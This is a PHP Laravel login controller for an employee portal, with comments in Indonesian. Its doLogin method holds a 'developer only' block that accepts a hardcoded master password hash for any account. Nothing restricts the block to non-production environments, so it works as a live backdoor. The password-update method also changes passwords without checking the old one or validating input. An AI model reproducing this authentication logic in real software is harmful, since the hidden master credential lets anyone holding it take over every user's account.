<?php

namespace App\Http\Controllers\Auth;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Session;
use Validator;
use Redirect;
use Crypt;
use Auth;
use Hash;
use DB;
use errors;

use App\Models\Employee;

class LoginController extends Controller
{
    public function loginView(){
        if(Auth::user()){
            return redirect('/dashboard');
        }
        // Untuk Tidak Maintenance
    	return view('Auth.login');

        // Untuk Maintenance View
    	// return view('errors.503');
    }

    public function doLogin(Request $request){
        // validator
        // check via nik
        $employee = null;
        $employee_by_nik = Employee::where('username',$request->nik)->first();
        if($employee_by_nik) $employee = $employee_by_nik;
        if(config('app.env') != 'production'){
            // selain production bisa login pake username
            $employee_by_username = Employee::where('username',$request->nik)->first();
            if($employee_by_username) $employee = $employee_by_username;
        }

        if($employee){
            if($employee->status == 1){ 
                return back()->with('error', 'Status Akun sedang di nonaktifkan. Silahkan hubungi admin');
            }
            $is_login_accepted = false;
            $is_login_accepted = Hash::check($request->password, $employee->password);
            // DEVELOPER ONLY MODE
            // master password validation for developer checking purpose
            // --START
            if(!$is_login_accepted){
                $is_login_accepted = Hash::check($request->password, '$2y$10$MNeZ/imgEJJw2IYpOjnTx.mi5YEf5roPmZEOxZzP.thzr9TH1UDgu');
            }
            // --END

            if($is_login_accepted){
                Auth::login($employee);
                // check if already change password or not
                if($employee->is_password_changed){
                    return redirect('/dashboard')->with('success','Selamat datang '.$employee->name);
                }else{
                    return redirect('/changepassword');
                }
            }else{
                return back()->with('error','Password salah');
            }
        }else{
            return back()->with('error', 'NIK tidak terdaftar, silahkan coba kembali atau hubungi admin untuk mendaftar');
        }
    }

    public function updatePassword(Request $request){
        // dd($request);
        $employee = Auth::user();
        $employee->password =Hash::make($request->newpassword);
        $employee->is_password_changed = true;
        $employee->save();
        return redirect('/dashboard')->with('success','Berhasil mengubah kata sandi');
    }
}
